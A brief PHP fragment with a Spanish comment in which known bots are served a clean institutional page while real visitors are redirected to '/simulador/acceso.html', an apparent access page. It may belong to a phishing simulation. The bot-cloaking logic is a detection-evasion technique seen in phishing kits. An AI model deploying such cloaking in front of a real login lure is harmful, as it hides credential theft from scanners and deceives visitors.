 ...
 *   · Bots conocidos → página institucional limpia (no los envía a /simulador/)
 *   · Visitantes reales → redirige a /simulador/acceso.html
 */
...
if (!$is_bot) {
    header('Location: /simulador/acceso.html', true, 302);
    exit;
}
